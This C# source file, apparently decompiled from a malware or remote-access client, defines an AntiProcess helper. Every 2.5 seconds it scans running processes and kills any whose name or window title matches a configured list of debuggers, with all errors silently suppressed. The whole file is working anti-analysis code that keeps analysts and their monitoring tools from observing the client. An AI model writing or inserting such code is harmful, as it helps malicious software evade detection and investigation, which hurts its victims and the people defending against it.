using System;
using System.Diagnostics;
using System.Threading;

namespace Client.Helper;

public static class AntiProcess
{
	private static Thread AntiProcessThread;

	private static bool IsRunning;

	public static void Start()
	{
		if (string.Equals(Config.Debugger, "true", StringComparison.OrdinalIgnoreCase) && !IsRunning)
		{
			IsRunning = true;
			AntiProcessThread = new Thread(Block);
			AntiProcessThread.Start();
		}
	}

	public static void Stop()
	{
		IsRunning = false;
		try
		{
			if (AntiProcessThread != null && AntiProcessThread.IsAlive)
			{
				AntiProcessThread.Abort();
			}
		}
		catch
		{
		}
	}

	private static void Block()
	{
		while (IsRunning)
		{
			try
			{
				string debuggerList = Config.DebuggerList;
				if (!string.IsNullOrEmpty(debuggerList))
				{
					string[] array = debuggerList.Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
					Process[] processes = Process.GetProcesses();
					foreach (Process process in processes)
					{
						try
						{
							string[] array2 = array;
							foreach (string text in array2)
							{
								string text2 = text;
								if (text2.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
								{
									text2 = text2.Substring(0, text2.Length - 4);
								}
								bool flag = process.ProcessName.Equals(text2, StringComparison.OrdinalIgnoreCase);
								if (!flag && !string.IsNullOrEmpty(process.MainWindowTitle))
								{
									flag = process.MainWindowTitle.IndexOf(text, StringComparison.OrdinalIgnoreCase) >= 0;
								}
								if (flag)
								{
									process.Kill();
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(2500);
		}
	}
}
